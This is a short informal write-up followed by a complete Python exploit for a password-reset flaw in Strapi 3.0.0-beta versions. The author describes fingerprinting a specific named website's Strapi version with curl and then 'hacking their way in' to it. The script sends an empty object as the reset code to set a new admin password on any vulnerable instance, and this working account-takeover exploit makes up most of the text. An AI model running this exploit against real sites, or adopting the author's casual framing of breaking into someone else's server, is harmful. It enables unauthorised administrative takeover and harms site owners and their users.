curl https://api.trabajosremotos.es/admin/strapiVersion                                                                                                           
{"strapiVersion":"3.0.0-beta.16.8"}
After looking the issue up on github, and taking a quick read at the changes, I wrote a quick-and-dirty stupid-proof exploit for it and hacked my way in (since none was available online). The issue was a lack of validation of the code parameter sent by the user, that leads to bypassing the code verification otherwise required for it to reset the password.

Well, that’s pretty much it. Morals of the story: always validate whatever comes from the user, and for fuck’s sake… update your shit buddy!

################################
##########################################
################################

import requests
import sys
import json
 
args=sys.argv
 
if len(args) < 4:
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
    exit(-1)
 
email = args[1]
url = args[2]
new_password =  args[3]
 
s  =  requests.Session()
 
version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
 
print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
 
#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)
 
#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)
 
print("[*] Response:")
print(str(r.content))

#####################################
##
##
